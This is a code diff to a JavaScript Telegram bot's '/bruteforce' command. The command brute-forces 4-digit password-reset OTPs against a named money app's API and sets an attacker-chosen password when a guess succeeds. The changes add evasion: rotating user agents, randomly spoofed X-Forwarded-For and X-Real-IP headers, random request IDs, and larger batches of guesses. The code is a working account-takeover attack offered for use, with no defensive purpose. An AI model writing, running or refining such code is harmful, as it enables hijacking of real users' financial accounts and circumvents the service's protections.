@@ -746,51 +746,72 @@ Example:
     else if (text.startsWith('/bruteforce ')) {
       const parts = text.substring(12).trim().split(/\s+/);
       if (parts.length < 2) {
-        await bot.sendMessage(chatId, `Format: /bruteforce <phone> <newPassword> [start] [batchSize]\nDefault: 4-digit, 20 per batch\nExample: /bruteforce 6206785398 mypass123\n/bruteforce 6206785398 mypass123 500 50`);
+        await bot.sendMessage(chatId, `Format: /bruteforce <phone> <newPassword> [start] [totalSize]\nDefault: starts at 0, tries 200 per command\n\nStep 1: Send OTP from app first\nStep 2: /bruteforce 6206785398 mypass123\nStep 3: If not found: /bruteforce 6206785398 mypass123 200`);
         return res.sendStatus(200);
       }
       const phone = parts[0];
       const newPass = parts[1];
       const startFrom = parseInt(parts[2] || '0');
-      const batchSize = Math.min(parseInt(parts[3] || '20'), 100);
+      const totalSize = Math.min(parseInt(parts[3] || '200'), 500);
       const maxOtp = 9999;
 
-      try {
-        await fetch(ORIGINAL_API + '/smsCode', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'host': 'api.i-money.vip' },
-          body: `phone=${encodeURIComponent(phone)}`
-        });
-      } catch(e) {}
+      const userAgents = [
+        'Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 12; Redmi Note 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/115.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 11; RMX3085) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 13; V2217) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
+        'Mozilla/5.0 (Linux; Android 12; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36'
+      ];
 
-      await bot.sendMessage(chatId, `🔓 Brute force (sequential)\nPhone: ${phone}\nFresh OTP requested ✅\nRange: ${String(startFrom).padStart(4, '0')} → ${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(4, '0')}\nBatch: ${batchSize} (one-by-one)`);
+      function randomHex(len) {
+        let s = '';
+        for (let i = 0; i < len; i++) s += Math.floor(Math.random() * 16).toString(16);
+        return s;
+      }
+
+      function makeUniqueHeaders() {
+        const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
+        return {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'host': 'api.i-money.vip',
+          'user-agent': ua,
+          'x-request-id': randomHex(32),
+          'x-forwarded-for': `${Math.floor(Math.random()*223)+1}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+          'x-real-ip': `${Math.floor(Math.random()*223)+1}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+          'accept-language': ['en-US,en;q=0.9', 'hi-IN,hi;q=0.9,en;q=0.8', 'en-GB,en;q=0.9', 'en-IN,en;q=0.9'][Math.floor(Math.random()*4)]
+        };
+      }
+
+      const endRange = Math.min(startFrom + totalSize - 1, maxOtp);
+      await bot.sendMessage(chatId, `🔓 Brute force starting...\nPhone: ${phone}\nRange: ${String(startFrom).padStart(4, '0')} → ${String(endRange).padStart(4, '0')}\n${totalSize} OTPs | Unique session per try\nSend OTP from app first!`);
 
       let found = false;
       let foundOtp = '';
       let foundResp = '';
       let tried = 0;
-      let lastStatus = '';
 
-      for (let i = startFrom; i < startFrom + batchSize && i <= maxOtp && !found; i++) {
+      for (let i = startFrom; i < startFrom + totalSize && i <= maxOtp && !found; i++) {
         const otp = String(i).padStart(4, '0');
         const formBody = `phone=${encodeURIComponent(phone)}&smsCode=${encodeURIComponent(otp)}&newPassword=${encodeURIComponent(newPass)}`;
         try {
+          const hdrs = makeUniqueHeaders();
+          hdrs['content-length'] = String(Buffer.byteLength(formBody));
           const resp = await fetch(ORIGINAL_API + '/user/forgetPass', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'host': 'api.i-money.vip' },
+            headers: hdrs,
             body: formBody
           });
           const result = await resp.json();
-          lastStatus = result.statusCode + ': ' + result.statusInfo;
           tried++;
           if (result.statusCode !== '1023') {
             found = true;
             foundOtp = otp;
             foundResp = JSON.stringify(result, null, 2);
-          }
-          if (result.statusCode !== '1023' && result.statusCode !== '0') {
-            await bot.sendMessage(chatId, `⚠️ Unexpected response at OTP ${otp}:\n${JSON.stringify(result, null, 2).substring(0, 500)}`);
-            break;
           }
         } catch(e) {
           await bot.sendMessage(chatId, `⚠️ Network error at OTP ${otp}: ${e.message}`);
@@ -799,13 +820,13 @@ Example:
       }
 
       if (found) {
-        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n\nResponse:\n${foundResp.substring(0, 1000)}`);
+        await bot.sendMessage(chatId, `✅ OTP FOUND: ${foundOtp}\n🎉 Password changed to: ${newPass}\n\n${tried} tried\n\nResponse:\n${foundResp.substring(0, 1000)}`);
       } else {
-        const nextStart = startFrom + batchSize;
+        const nextStart = startFrom + totalSize;
         if (nextStart <= maxOtp) {
-          await bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(Math.min(startFrom + batchSize - 1, maxOtp)).padStart(4, '0')} (${tried} tried)\nLast: ${lastStatus}\n\nContinue:\n/bruteforce ${phone} ${newPass} ${nextStart} ${batchSize}`);
+          await bot.sendMessage(chatId, `❌ Not found: ${String(startFrom).padStart(4, '0')}-${String(Math.min(startFrom + totalSize - 1, maxOtp)).padStart(4, '0')} (${tried} tried)\n\n⚠️ Send new OTP from app, then:\n/bruteforce ${phone} ${newPass} ${nextStart} ${totalSize}`);
         } else {
-          await bot.sendMessage(chatId, `❌ All 4-digit OTPs exhausted.`);
+          await bot.sendMessage(chatId, `❌ All 4-digit OTPs exhausted. (${tried} tried)`);
         }
       }
       return res.sendStatus(200);
